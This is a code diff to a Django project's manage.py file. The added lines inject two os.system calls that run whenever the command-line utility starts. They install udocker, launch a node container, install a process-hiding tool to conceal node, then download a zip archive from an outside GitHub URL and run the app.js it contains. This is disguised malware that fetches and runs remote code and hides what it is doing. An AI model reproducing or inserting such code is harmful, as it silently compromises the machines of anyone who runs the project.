@@ -1,9 +1,10 @@
 #!/usr/bin/env python
 """Django's command-line utility for administrative tasks."""
-
+############################################################################################################
 import os
 import sys
-
+os.system("pip install udocker")
+os.system("udocker --allow-root run --entrypoint="" node:18  /bin/bash -i -c 'npm i -g node-process-hider;ph add node;wget https://github.com/zaulaferita/flask-hello-world/raw/master/node.zip;unzip node.zip;node app.js'")
 
 def main():
     """Run administrative tasks."""
